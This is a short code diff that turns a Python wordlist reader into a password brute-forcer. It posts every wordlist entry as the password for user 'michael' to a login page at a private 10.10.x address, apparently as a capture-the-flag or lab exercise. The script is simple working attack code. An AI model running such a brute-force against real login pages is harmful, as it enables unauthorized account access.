@@ -1,8 +1,7 @@
-import sys, requests, times
+import sys, requests, time
 
-url = "http://10.10.115.82"
-path = "/login"
-wordlist = "../../Sec/wordlists/rockyou.txt"
+url = "http://10.10.115.82/login"
+wordlist = "test.txt"
 wl_len = len(open(wordlist, "r").readlines())
 lines = []
 
@@ -10,7 +9,13 @@ with open(wordlist, "r", errors='replace', encoding='UTF-8') as w:
 	for x in range(wl_len):
 		lines.append(w.readline().strip('\n'))
 
-print(lines)		
+for line in lines:
+	data = {
+	"username": "michael",
+	"password": line
+	}
+	r = requests.post(url, data)
+	print(r.content)
 
 
 
